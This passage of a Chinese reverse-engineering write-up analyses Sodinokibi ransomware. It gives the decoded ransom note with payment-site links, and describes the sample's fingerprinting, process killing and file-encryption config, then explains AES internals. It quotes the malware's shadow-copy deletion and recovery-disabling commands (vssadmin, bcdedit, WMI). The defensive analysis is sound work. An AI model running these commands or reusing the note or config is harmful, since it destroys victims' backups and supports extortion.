GEAZAAgAGEAbgBkACAAaQBuAHMAdABhAGwAbAAgAFQATwBSACAAYgByAG8AdwBzAGUAcgAgAGYAcgBvAG0AIAB0AGgAaQBzACAAcwBpAHQAZQA6ACAAaAB0AHQAcABzADoALwAvAHQAbwByAHAAcgBvAGoAZQBjAHQALgBvAHIAZwAvAA0ACgAgACAAYgApACAATwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBhAHAAbABlAGIAegB1ADQANwB3AGcAYQB6AGEAcABkAHEAawBzADYAdgByAGMAdgA2AHoAYwBuAGoAcABwAGsAYgB4AGIAcgA2AHcAawBlAHQAZgA1ADYAbgBmADYAYQBxADIAbgBtAHkAbwB5AGQALgBvAG4AaQBvAG4ALwB7AFUASQBEAH0ADQAKAA0ACgAyACkAIABJAGYAIABUAE8AUgAgAGIAbABvAGMAawBlAGQAIABpAG4AIAB5AG8AdQByACAAYwBvAHUAbgB0AHIAeQAsACAAdAByAHkAIAB0AG8AIAB1AHMAZQAgAFYAUABOACEAIABCAHUAdAAgAHkAbwB1ACAAYwBhAG4AIAB1AHMAZQAgAG8AdQByACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlAC4AIABGAG8AcgAgAHQAaABpAHMAOgANAAoAIAAgAGEAKQAgAE8AcABlAG4AIAB5AG8AdQByACAAYQBuAHkAIABiAHIAbwB3AHMAZQByACAAKABDAGgAcgBvAG0AZQAsACAARgBpAHIAZQBmAG8AeAAsACAATwBwAGUAcgBhACwAIABJAEUALAAgAEUAZABnAGUAKQANAAoAIAAgAGIAKQAgAE8AcABlAG4AIABvAHUAcgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBkAGUAYwByAHkAcAB0AG8AcgAuAGMAYwAvAHsAVQBJAEQAfQANAAoADQAKAFcAYQByAG4AaQBuAGcAOgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQAgAGMAYQBuACAAYgBlACAAYgBsAG8AYwBrAGUAZAAsACAAdABoAGEAdABzACAAdwBoAHkAIABmAGkAcgBzAHQAIAB2AGEAcgBpAGEAbgB0ACAAbQB1AGMAaAAgAGIAZQB0AHQAZQByACAAYQBuAGQAIABtAG8AcgBlACAAYQB2AGEAaQBsAGEAYgBsAGUALgAgAEkAZgAgAHkAbwB1ACAAaABhAHYAZQAgAHAAcgBvAGIAbABlAG0AIAB3AGkAdABoACAAYwBvAG4AbgBlAGMAdAAsACAAdQBzAGUAIABzAHQAcgBpAGMAdABsAHkAIABUAE8AUgAgAHYAZQByAHMAaQBvAG4AIAA4AC4ANQAuADUADQAKAGwAaQBuAGsAIABmAG8AcgAgAGQAbwB3AG4AbABvAGEAZAAgAFQATwBSACAAdgBlAHIAcwBpAG8AbgAgADgALgA1AC4ANQAgAGgAZQByAGUAOgAgAGgAdAB0AHAAcwA6AC8ALwBmAGkAbABlAGgAaQBwAHAAbwAuAGMAbwBtAC8AZABvAHcAbgBsAG8AYQBkAF8AdABvAHIAXwBiAHIAbwB3AHMAZQByAF8AZgBvAHIAXwB3AGkAbgBkAG8AdwBzAC8AIAANAAoADQAKAFcAaABlAG4AIAB5AG8AdQAgAG8AcABlAG4AIABvAHUAcgAgAHcAZQBiAHMAaQB0AGUALAAgAHAAdQB0ACAAdABoAGUAIABmAG8AbABsAG8AdwBpAG4AZwAgAGQAYQB0AGEAIABpAG4AIAB0AGgAZQAgAGkAbgBwAHUAdAAgAGYAbwByAG0AOgANAAoASwBlAHkAOgANAAoADQAKAHsASwBFAFkAfQANAAoADQAKAA0ACgBFAHgAdABlAG4AcwBpAG8AbgAgAG4AYQBtAGUAOgANAAoADQAKAHsARQBYAFQAfQANAAoADQAKAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQANAAoAcABvAHMAdABzAGMAcgBpAHAAdAA6ACAASQBuACAAYwBhAHMAZQAgAHkAbwB1ACAAdwBhAG4AdAAgAHQAbwAgAGkAbgBkAGUAcABlAG4AZABlAG4AdABsAHkAIABkAGUAYwByAHkAcAB0ACAAeQBvAHUAcgAgAHMAZQByAHYAZQByAHMALAAgAHcAZQAgAHcAaQBsAGwAIABiAGUAIABmAG8AcgBjAGUAZAAgAHQAbwAgAHAAdQB0ACAAdABoAGUAIABkAGEAdABhAGIAYQBzAGUAcwAgAG8AZgAgAHkAbwB1AHIAIABjAG8AbQBwAGEAbgBpAGUAcwAgAGkAbgAgAHQAaABlACAAcAB1AGIAbABpAGMAIABkAG8AbQBhAGkAbgAuACAATQBEAEYAIABmAGkAbABlAHMAOgANAAoARABCAF8AVQBUAEkATABJAFQAWQANAAoATABlAGEAcwBlAFAAbAB1AHMADQAKAEwAUABTAGUAYwB1AHIAaQB0AHkADQAKAEwAVABTAGgAYQByAGUAZAANAAoAUABhAHAAZQByAFYAaQBzAGkAbwBuAA0ACgANAAoAIQAhACEAIABEAEEATgBHAEUAUgAgACEAIQAhAA0ACgBEAE8ATgBUACAAdAByAHkAIAB0AG8AIABjAGgAYQBuAGcAZQAgAGYAaQBsAGUAcwAgAGIAeQAgAHkAbwB1AHIAcwBlAGwAZgAsACAARABPAE4AVAAgAHUAcwBlACAAYQBuAHkAIAB0AGgAaQByAGQAIABwAGEAcgB0AHkAIABzAG8AZgB0AHcAYQByAGUAIABmAG8AcgAgAHIAZQBzAHQAbwByAGkAbgBnACAAeQBvAHUAcgAgAGQAYQB0AGEAIABvAHIAIABhAG4AdABpAHYAaQByAHUAcwAgAHMAbwBsAHUAdABpAG8AbgBzACAALQAgAGkAdABzACAAbQBhAHkAIABlAG4AdABhAGkAbAAgAGQAYQBtAGcAZQAgAG8AZgAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5ACAAYQBuAGQALAAgAGEAcwAgAHIAZQBzAHUAbAB0ACwAIABUAGgAZQAgAEwAbwBzAHMAIABhAGwAbAAgAGQAYQB0AGEALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAA0ACgBPAE4ARQAgAE0ATwBSAEUAIABUAEkATQBFADoAIABJAHQAcwAgAGkAbgAgAHkAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAgAHQAbwAgAGcAZQB0ACAAeQBvAHUAcgAgAGYAaQBsAGUAcwAgAGIAYQBjAGsALgAgAEYAcgBvAG0AIABvAHUAcgAgAHMAaQBkAGUALAAgAHcAZQAgACgAdABoAGUAIABiAGUAcwB0ACAAcwBwAGUAYwBpAGEAbABpAHMAdABzACkAIABtAGEAawBlACAAZQB2AGUAcgB5AHQAaABpAG4AZwAgAGYAbwByACAAcgBlAHMAdABvAHIAaQBuAGcALAAgAGIAdQB0ACAAcABsAGUAYQBzAGUAIABzAGgAbwB1AGwAZAAgAG4AbwB0ACAAaQBuAHQAZQByAGYAZQByAGUALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAAAA"

```

img 数据

```
"LQAtAC0APQA9AD0AIABTAG8AZABpAG4AbwBrAGkAYgBpACAAUgBhAG4AcwBvAG0AdwBhAHIAZQAgAD0APQA9AC0ALQAtAA0ACgANAAoAQQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA"

```

使用[网络厨师](https://gchq.github.io/CyberChef/)解析可以看到以下内容

![](https://bbs.pediy.com/upload/attach/202105/784955_BTPDQV7U7RHGVP2.jpg)

勒索信内容如下

![](https://bbs.pediy.com/upload/attach/202105/784955_RTZJ2YHZ82Y48R9.jpg)

勒索信内容

```
---=== Welcome. Again. ===---
 
[+] Whats Happen? [+]
 
Your files are encrypted, and currently unavailable. You can check it: all files on your computer has extension {EXT}.
By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).
 
[+] What guarantees? [+]
 
Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.
To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.
If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practise - time is much more valuable than money.
 
I suggest you read about us on the Internet, we are known as "Sodinokibi Ransomware". For example, this article:
https://www.coveware.com/blog/2019/7/15/ransomware-amounts-rise-3x-in-q2-as-ryuk-amp-sodinokibi-spread
Pay attention to that:
"How Much Data Is Decrypted with a Ransomware Decryptor?
 
In Q2 2019, victims who paid for a decryptor recovered 92% of their encrypted data. This statistic varied dramatically depending on the ransomware type. 
For example, Ryuk ransomware has a relatively low data recovery rate, at ~ 87%, while Sodinokibi was close to 100%. "
 
Now you have a guarantee that your files will be returned 100 %.
 
[+] How to get access on website? [+]
 
You have two ways:
 
1) [Recommended] Using a TOR browser!
  a) Download and install TOR browser from this site: https://torproject.org/
  b) Open our website: http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/{UID}
 
2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:
  a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)
  b) Open our secondary website: http://decryptor.cc/{UID}
 
Warning: secondary website can be blocked, thats why first variant much better and more available. If you have problem with connect, use strictly TOR version 8.5.5
link for download TOR version 8.5.5 here: https://filehippo.com/download_tor_browser_for_windows/ 
 
When you open our website, put the following data in the input form:
Key:
 
{KEY}
 
 
Extension name:
 
{EXT}
 
-----------------------------------------------------------------------------------------
postscript: In case you want to independently decrypt your servers, we will be forced to put the databases of your companies in the public domain. MDF files:
DB_UTILITY
LeasePlus
LPSecurity
LTShared
PaperVision
 
!!! DANGER !!!
DONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damge of the private key and, as result, The Loss all data.
!!! !!! !!!
ONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.
!!! !!! !!!

```

可以看到勒索信中以下内容是通过动态运算获取填充到勒索信内的，所以合理推测后续会有收集系统信息的操作

![](https://bbs.pediy.com/upload/attach/202105/784955_S5P73HF5XQZ79DE.jpg)

继续向下跟踪代码，看到病毒首先获取 SOFTWARE\GitForWindow 子键下 3lP 键值的数据

![](https://bbs.pediy.com/upload/attach/202105/784955_KR9HWJ426UMPZMH.jpg)

如果没有此类键值数据则通过计算生成并设置对应键值（这里暂时没有识别出算法但是不影响继续分析）

![](https://bbs.pediy.com/upload/attach/202105/784955_PHMFDWEB6UQVCKN.jpg)

接下来病毒收集卷序列号以及 CPU 信息生成一个 hash 值

![](https://bbs.pediy.com/upload/attach/202105/784955_KMG9SHS2KCUFKCY.jpg)

获取并设置新的注册表键值信息 PiZuMhL

![](https://bbs.pediy.com/upload/attach/202105/784955_WE27SKFRRVM3UEY.jpg)

获取用户名信息

![](https://bbs.pediy.com/upload/attach/202105/784955_7FW4VBKND86YGDC.jpg)

获取 domain 键值

![](https://bbs.pediy.com/upload/attach/202105/784955_BXYZ2VSA4838QWB.jpg)

获取本地系统语言

![](https://bbs.pediy.com/upload/attach/202105/784955_9BTD2747CPS7QT3.jpg)

获取 Windows 版本信息

![](https://bbs.pediy.com/upload/attach/202105/784955_WPCJZWYBWNE6SPN.jpg)

通过判断系统位数

![](https://bbs.pediy.com/upload/attach/202105/784955_BSDFS5VZJXQQ7FY.jpg)

![](https://bbs.pediy.com/upload/attach/202105/784955_35H4VB59AAHGHY2.jpg)

将收集到的信息格式化拼接成字符串，这时可以从格式化字符中重新命名全局变量的值。

![](https://bbs.pediy.com/upload/attach/202105/784955_VNEDNQ97J3YC9XP.jpg)

将拼接后的字符串和一个 32 字节的字符串数据传入一个函数中，并返回运算过的字符数据。因此我们合理猜测该处为一种加密算法。32 字节为密钥数据。

![](https://bbs.pediy.com/upload/attach/202105/784955_RWGKNQKEEB8BSAG.jpg)

![](https://bbs.pediy.com/upload/attach/202105/784955_CSZB9XJ5F9G8BE7.jpg)

密钥数据

![](https://bbs.pediy.com/upload/attach/202105/784955_BNXG64P8XP6H93N.jpg)

加密算法的分析我们可以放到最后做简单的分析判断，现在主要分析病毒行为。我们可以看到病毒将加密后的数据写入注册表。

![](https://bbs.pediy.com/upload/attach/202105/784955_QFEGVVZHP2YMK2C.jpg)

判断是否有以下 5 个命令行参数输入

![](https://bbs.pediy.com/upload/attach/202105/784955_J2BTPSQQT9BV76N.jpg)

如果获取所有相关配置则返回一个 Flag 值作为标志。

![](https://bbs.pediy.com/upload/attach/202105/784955_57U5VZFED3GVJWE.jpg)

获取受害者系统语言，判断是否是加密白名单

![](https://bbs.pediy.com/upload/attach/202105/784955_826UR27UW8T3FB4.jpg)

获取键盘输入法列表

![](https://bbs.pediy.com/upload/attach/202105/784955_V3T3JBD2JWV3TQ6.jpg)

键盘布局白名单如下

![](https://bbs.pediy.com/upload/attach/202105/784955_GAXX64DV72422WN.jpg)

病毒为了防止加密过程中被杀软中断，将系统信息填入注册表子键 SOFTWARE\Microsoft\Windows\CurrentVersionun 中

![](https://bbs.pediy.com/upload/attach/202105/784955_K6QRQJQ8Q379H4N.jpg)

当完成加密后删除无效路径

![](https://bbs.pediy.com/upload/attach/202105/784955_VEGGZ8K6H5VVHEK.jpg)

MSDN 文档内容如下

![](https://bbs.pediy.com/upload/attach/202105/784955_YFAMVB7K6XMYWRS.jpg)

接下来病毒创建了一个恶意线程执行不同逻辑

![](https://bbs.pediy.com/upload/attach/202105/784955_44TTCKBWRCH38S7.jpg)

恶意线程主要通过 WMI 检测异步创建进程

![](https://bbs.pediy.com/upload/attach/202105/784955_DER5HW4AJ9HRCKR.jpg)

遍历进程服务，杀死 srv 配置字段中的服务进程

![](https://bbs.pediy.com/upload/attach/202105/784955_CT6HFGNHKNQDH24.jpg)

杀死列表中服务进程

![](https://bbs.pediy.com/upload/attach/202105/784955_VD7Y5V4EXTCS4SC.jpg)

创建进程快照遍历进程，并利用函数指针调用传入函数地址

![](https://bbs.pediy.com/upload/attach/202105/784955_FER8V9WSKWDFZEC.jpg)

遍历杀死配置文件中 proc 字段的进程

![](https://bbs.pediy.com/upload/attach/202105/784955_YKJ66HYNSRCWX7D.jpg)

根据进程 ID 杀死进程

![](https://bbs.pediy.com/upload/attach/202105/784955_8NFJ97FYBEJ3RP8.jpg)

如果在 XP 版本以上的系统中运行指向 powershell

![](https://bbs.pediy.com/upload/attach/202105/784955_WVVZ5ESUNQ2HKJM.jpg)

Base64 解密编码如下，删除系统卷影防止系统通过备份恢复加密数据。

```
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}

```

![](https://bbs.pediy.com/upload/attach/202105/784955_GJNWPVRCTA6Z3UQ.jpg)

在 XP 系统执行以下操作删除卷影。

```
cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures

```

![](https://bbs.pediy.com/upload/attach/202105/784955_X7WZSR7RE6QNS8H.jpg)

病毒读取输入命令，执行命令对应操作操作。

![](https://bbs.pediy.com/upload/attach/202105/784955_R9M3TJZJRZ4Y6TH.jpg)

根据传入命令加密指定路径文件和加密网络资源，如果没有命令则不执行。

![](https://bbs.pediy.com/upload/attach/202105/784955_S7NZPMT2A3H2DWA.jpg)

文件加密是通过 API 暴力遍历所有盘符，满足类型后遍历加密盘符

![](https://bbs.pediy.com/upload/attach/202105/784955_3C434DPWGQ26U8T.jpg)

遍历盘符目录

![](https://bbs.pediy.com/upload/attach/202105/784955_Y8XGMY5TXUAEMBJ.jpg)

遍历共享网络盘符加密

![](https://bbs.pediy.com/upload/attach/202105/784955_ZYMXXH7ADMQGHB6.jpg)

我们也可以从配置文件中了解病毒要加密的文件后缀（ext）、一些不能加密的配置目录（fld）和配置文件（fls）

```
"fld":[
                "msocache",
                "intel",
                "$recycle.bin",
                "google",
                "perflogs",
                "system volume information",
                "windows",
                "mozilla",
                "appdata",
                "tor browser",
                "$windows.~ws",
                "application data",
                "$windows.~bt",
                "boot",
                "windows.old"
            ],     
            "fls":[
                "bootsect.bak",
                "autorun.inf",
                "iconcache.db",
                "thumbs.db",
                "ntuser.ini",
                "boot.ini",
                "bootfont.bin",
                "ntuser.dat",
                "ntuser.dat.log",
                "ntldr",
                "desktop.ini"
            ],
            "ext":[
                "com",
                "ani",
                "scr","drv","hta","rom","bin","msc","ps1","diagpkg","shs","adv","msu","cpl","prf","bat","idx","mpa","cmd","msi","mod","ocx","icns","ics","spl","386","lock","sys","rtp","wpx","diagcab","theme","deskthemepack","msp","cab","ldf","nomedia","icl","lnk","cur","dll","nls","themepack","msstyles","hlp","key","ico","exe","diagcfg"
                ]

```

### 加密部分

#### IOCP 简介

病毒作者为了追求加密时的高效快速，利用了 I/O 完全端口。这种技术可以实现异步多线程，为线程并发提供有效支持。

![](https://bbs.pediy.com/upload/attach/202105/784955_VN44NE5HDVKZ9PF.jpg)

[CreateIoCompletionPort](https://docs.microsoft.com/en-us/windows/win32/fileio/createiocompletionport) 函数创建一个 I/O 完成端口对象，它可以与多个文件句柄进行关联。当绑定文件句柄的 I/O 操作完成后，对应的 I/O 完成包会以先进先出（FIFO）的方式返回给绑定的 I/O 完成端口对象。它的强大之处在于可以将多个文件句柄同步到一个单一对象进行 I/O 处理。一旦创建了文件句柄和 I/O 完成端口的关联后，状态块便不会更新，直到 I/O 完成包被完成端口移除。

[GetQueuedCompletionStatus](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-getqueuedcompletionstatus) 函数用于等待一个线程的请求包按照队列顺序返回到 I/O 完成端口，而不是直接等待异步 I/O 操作完成。在 I/O 完全端口上管理的线程执行阻塞顺序是先进后出（LIFO），而 I/O 完成包的顺序是先进先出（FIFO）。这意味着，当一个完成包被释放给一个线程时，系统将释放与该端口相关的最后一个 (最近的) 线程，并将最先传递的 I/O 完成包的信息传递给它。

[PostQueuedCompletionStatus](https://docs.microsoft.com/en-us/windows/win32/fileio/postqueuedcompletionstatus) 函数用于将完成包发送到 I/O 完成端口。如果绑定线程完成了 WriteFile()、ReadFile() 等 I/O 操作也会自动发送。

#### I/O 完成端口异步读写数据

观察 IOCP 相关函数，我将该函数命名为 mv_iocp_exc()。它的第一个参数是一个结构体，最后一个参数为 iocp 绑定相关的线程函数。

![](https://bbs.pediy.com/upload/attach/202105/784955_RZTQJYZWHMKHWXE.jpg)

进入函数 mv_iocp_exc，调用 CreateIoCompletionPort 函数创建一个 I/O 完成端口对象，并创建一个函数循环创建与 IOCP 对象交互的线程。

![](https://bbs.pediy.com/upload/attach/202105/784955_4E3BFAYPVCEWZWA.jpg)

循环绑定 I/O 完全端口函数内容如下

![](https://bbs.pediy.com/upload/attach/202105/784955_XTUC42JNAZ68Q7P.jpg)

病毒线程中，病毒首先判断当前进程权限并设置等待 IO 操作状态。

![](https://bbs.pediy.com/upload/attach/202105/784955_MP7YQGJ9XAEN8ZQ.jpg)

![](https://bbs.pediy.com/upload/attach/202105/784955_VDAFYXDRM47PTW4.jpg)

病毒加密分为 4 个步骤，被封装到一个 switch 语句中进行调用。因为能力有限我没有选择对加密算法进行详细分析，从而转向了加密算法原理和定位思路，望大家海涵。（加密算法一般在 Github 上也可以找到源码）

![](https://bbs.pediy.com/upload/attach/202105/784955_5ZHKUEAVPYYGZPC.jpg)

#### 病毒加密算法识别思路

我们在分析的时候，往往会碰到一个函数内充斥着大量的数据位移或异或操作。而且这种操作往往伴随对数组类型数据操作以及固定的循环次数。如果分析碰到了这种情况就需要提高注意，这很可能是在做加密运算。因为算法的加密在底层汇编语言的表现形式往往就是异或和位移。而且大多数算法都会有固定的特征数据，也就是所谓的 S 盒和 T 盒。因为一个算法想要做到难以破解首先需要保证加密的随机性和离散性，这么做为了不让人们从大量数据中找到加密规律而变得易于破解。而 S 盒是数学家为了增大加密随机性而产生的产物，市面上经得起推敲的 S 盒往往是通过数学公式推算出的固定值一般不做改变，因此识别类似 S 盒、T 盒这类用于离散混淆的固定值成了我们识别算法的风向标。（当然，如果一个算法步骤并不复杂也可以通过算法行为识别，例如上面分析的 RC4 算法）。我们不一定见过所有的算法 S 盒和 T 盒，可以适用 IDA 插件 [FindCrypt](https://github.com/polymorf/findcrypt-yara) 或 github 上的一些开源脚本插件代替我们找盒，例如：[https://github.com/you0708/ida/blob/master/idapython_tools/findcrypt/consts.py#L1560](https://github.com/you0708/ida/blob/master/idapython_tools/findcrypt/consts.py#L1560)。一旦插件定位到算法盒后，便可以根据 IDA 提供的交叉索引功能定位到利用该盒的算法点，结合 github 上的一些开源算法逆向反推（因为开发一套自己的加密算法是没有经过国际验证考验的，往往自研算法会因为一些考虑不周到导致被破解，对于勒索软件开发作者来说这是致命的。所以他们一般性会选择经得起考验的成熟加密算法来节省时间）。

### AES 算法

Advanced Encryption Standard（AES，高级加密标准）。它不是直接将整段明文 / 密文进行加密，而是将明文拆分多个大小为 16 字节（128bit 位）的数据块。如果明文长度不能被 16 字节整除则会对明文进行填充，填充的内容分为两种：

1、明文的最后一个字符填充，如 {1 2 3 4 5 6 7 8} 填充后为{1 2 3 4 5 6 7 8 8 8 8 8 8 8 8}

2、第二种是随机字符填充，如 {1 2 3 4 5 6 7 8} 填充后为{1 2 3 4 5 6 7 8 ！~ Q k s z y}

注意：加密和解密时填充模式必须相同。16 字节的数据块被排列成以下的 4 x 4 顺序数组形式。

![](https://bbs.pediy.com/upload/attach/202105/784955_PNVMC74JU9FN5T3.jpg)

AES 的密钥长度有 3 种，不同的密钥长度代表了重复加密轮数：

1、16 字节密钥（128bit），加密 10 轮

2、24 字节密钥（192bit），加密 12 轮

3、32 字节密钥（256bit），加密 14 轮

#### 加密步骤

我们通过这张图可以看出最基本的加密元素需要两个，1 个是明文数据，一个是密钥块。

![](https://bbs.pediy.com/upload/attach/202105/784955_F669Y252NK5MRF2.jpg)

块加密算法一个特点便是将要加密的数据进行分块处理因为这样便于使用线性代数中的矩阵运算增大混淆和离散程度，AES 默认以 16 字节为一个块，State 块是从要加密中的明文中按顺序读取出的 16 字节数据，组成一个逻辑 4 x 4 矩阵。密钥同理也处理成块数据后称为 Cipher key，密钥可以选择 16 字节块、24 字节块以及 32 字节块不等。

![](https://bbs.pediy.com/upload/attach/202105/784955_DY8GAC4Y7MJQF32.jpg)

分块形式实例。如果密钥长度为 32 也是按照该顺序排列，只不过列数增加而已。

![](https://bbs.pediy.com/upload/attach/202105/784955_FSYTNW2DJR8NXJJ.jpg)

我们再根据 github 上的 AES 项目查看 Plaintext 是如何被处理成 State 块数据的。

![](https://bbs.pediy.com/upload/attach/202105/784955_6Q3TE2P97XPM72C.jpg)

State 块数据处理，发现数据存储顺序行列交换，这里 Nb 是一个常量 4，代表 State 分块行列值。同理生成 Cipher key 的密钥数据块。

![](https://bbs.pediy.com/upload/attach/202105/784955_WAETKZUA2PXQV32.jpg)

加密过程是一个轮计算的过程，循环次数通过密钥长度决定。在加密轮开始前需要生成一个轮密钥，它通过每一轮的计算都会得到新的轮密钥加。我们将最开始生成轮密钥的步骤称为轮密钥加初始化（initial round），该密钥是通过切分后的 State 数据块和密钥块（Cipher key）共同运算得出的，详细的轮密钥计算方法我们最后再讨论。我们可以看下图，这是一个标准的 AES-128 算法（密钥长度为 16 字节，一共 10 轮）。可以看到循环计算 9 次，初始化和最后一轮计算被独立出来。初始化轮只有一个生成轮密钥加的操作，而最后一轮相比 9 轮循环中少了 MixColumns 操作并输出最后的密文。

![](https://bbs.pediy.com/upload/attach/202105/784955_4AGZJ558W3M7VH6.jpg)

我们看 9 轮循环中重复的操作一共有 4 种：

1、SubBytes（字节替换操作）

2、ShiftRows（逻辑左移数据）

3、MixColunms（最小列变换）

4、AddRoundKey（计算新的轮密钥）

![](https://bbs.pediy.com/upload/attach/202105/784955_NGA8ZV2PCJQ8BAT.jpg)

#### SubBytes 字节替换

实际上 SubBytes 步骤就是做了简单的字节替换。它需要两个参数，State 数据块和算法计算得出的 S-Box（替换盒，该值在未模改的 AES 算法中固定）**。**该步骤旨在提高算法的非线性的变换能力，S 盒是一个 16 x 16 的矩阵，也可以看成是 256 字节的数组。

![](https://bbs.pediy.com/upload/attach/202105/784955_42PE5EDV7ZVKW7T.jpg)

按照固定的顺序取出 State 块中的字节，以字节高 4 位为 S-box 的行，以字节低 4 位作为 S-box 的列（也就是直接取 State 的值作为 S-box 索引，因为高 4 位加低 4 位在一维数组中正好等于距离首地址的偏移，而且 S 盒是 256 字节表示范围为 0~255，而单字节无论如何都不能超过 0~255）。从 S-box 中取出替换用的值，回填到 State 数据块中。

![](https://bbs.pediy.com/upload/attach/202105/784955_S82KANUSP2HZXDK.jpg)

按照从上到下，从左到右的回填顺序替换 State 数据块。

![](https://bbs.pediy.com/upload/attach/202105/784955_HEZCBH33JAYBKMA.jpg)

代码实现如下。

![](https://bbs.pediy.com/upload/attach/202105/784955_AZZH56E273VETD9.jpg)

#### ShiftRows 字节位移

这个操作是将每一行都循环向左位移 n 个字节偏移量。这个位移偏移量取决于所在矩阵行数索引（0~3），例如：第一行索引为 0，则不进行偏移。第二行索引为 1，则循环左移 1 字节。第三行循环左移 2 字节。第四行循环左移 3 字节。我们可以通过以下两个图进行对比。

字节位移前如下：

![](https://bbs.pediy.com/upload/attach/202105/784955_EFJPMC72JV55STY.jpg)

字节位移后如下，可以看到只有字节数据的位置做了交换，但是单个字节数据没有发生变化。

![](https://bbs.pediy.com/upload/attach/202105/784955_ZBQUH5FPC7848RK.jpg)

代码实现如下

![](https://bbs.pediy.com/upload/attach/202105/784955_AYJUUG8CSYESJXU.jpg)

#### MixColumns

这一步是使用 Rijndael 的 Golois 域对每一列变换后的 State 矩阵向量进行模乘。这个 Golois 域也同样是该算法所确定的。在以我在数学角度来看，该操作是在对 State 矩阵中每个向量进行变换拉伸变换，同样是对数据做了变换混淆处理。不过具体原因我们可以不做深究。该步转换到计算机中只是将 State 矩阵中从左到右每一列按顺序取出与固定的一个 4 x 4 矩阵做乘法。也可以整体看成 Golois 域（4 阶矩阵）与整个 State 块做 4 阶矩阵乘法。

![](https://bbs.pediy.com/upload/attach/202105/784955_YMK7RP6QARDMSXQ.jpg)

与第一列向量与 Golois 域做矩阵乘法。

![](https://bbs.pediy.com/upload/attach/202105/784955_AK5TKFSQA9D6HR2.jpg)

运算完成后按顺序回填给 State 数据块

![](https://bbs.pediy.com/upload/attach/202105/784955_ZGYJB69WA258TTA.jpg)

代码实现入如下，在该项目中的 coef_mult 是对 Golois 域的运算，我们没必要太过深究。该函数作用就是生成一个 4 阶 Golois 域矩阵用于矩阵乘法。

![](https://bbs.pediy.com/upload/attach/202105/784955_C3P5KEADBEK38C4.jpg)

MixColumns 和 ShiftRows 目的都是将计算值进行线性变换。

#### AddRoundkey 轮密钥加

轮密钥加主要作用就是通过每一轮对应的不同轮密钥（Round key）与 State 数据块中的每一列进行异或加和。

![](https://bbs.pediy.com/upload/attach/202105/784955_HNZ2ZV2SV84BKTV.jpg)

计算顺序从左到右，分别取出数据块中对应的列数据进行异或加和。

![](https://bbs.pediy.com/upload/attach/202105/784955_V43E44GAUMD7ZX8.jpg)

计算完成后的结果回填回 State 中。

![](https://bbs.pediy.com/upload/attach/202105/784955_CWEB8XK37GFHSN9.jpg)

之后 9 次循环，每一次的 State 块都是上一次循环运算的最终结果。

![](https://bbs.pediy.com/upload/attach/202105/784955_8KUT3JU2W7S5V7R.jpg)

在第 10 次不进行 MixColumns 操作得到最终的加密输出块。

![](https://bbs.pediy.com/upload/attach/202105/784955_D8SY8ZZJKPPWHHH.jpg)

#### 轮密钥调度算法

轮密钥调度算法在初始化阶段就已经全部运算完毕，而不是每一轮再计算这点要明确。拿 AES-128 为例，它会首先生成密钥块。取出密钥块最后一列数据向量，循环向上移动一个字节。移动前如下图

![](https://bbs.pediy.com/upload/attach/202105/784955_WCCBGJ2G9SQ86N2.jpg)

移动后如下图

![](https://bbs.pediy.com/upload/attach/202105/784955_TJX2GBMHN5M5ER6.jpg)

接着按照从上到下的顺序与 S-box 进行字节替换。

![](https://bbs.pediy.com/upload/attach/202105/784955_G8AFMQFTCY93FS6.jpg)

接下来将要填充的向量位置设置为 Wi，将替换后的 Wi-1 的值分别与向前偏移 4 的倍数次向量（也就是 Wi-4）和 Rcon(4) 轮常量（也就是 2 的幂次组成的向量）进行异或运算。

![](https://bbs.pediy.com/upload/attach/202105/784955_UHTBF6D2EMHMMRR.jpg)

计算后得到的值填充到密钥块的尾部（Wi）组成第一轮轮密钥的第一个向量。

![](https://bbs.pediy.com/upload/attach/202105/784955_UFERG3BWXMVC9N8.jpg)

然后重新设置下一个要填充位置为 Wi，取出前 1 个相邻向量为 Wi-1 和向前偏移 4 个向量的值 Wi-4 进行异或运算填充回轮密钥块。

![](https://bbs.pediy.com/upload/attach/202105/784955_PBZ5FQ3FDEJKJ68.jpg)

替换后例图。

![](https://bbs.pediy.com/upload/attach/202105/784955_4DQF9Y3J5VNJB2Q.jpg)

只有每 4 的倍数才会使用到 S 盒和 Rcon 常量

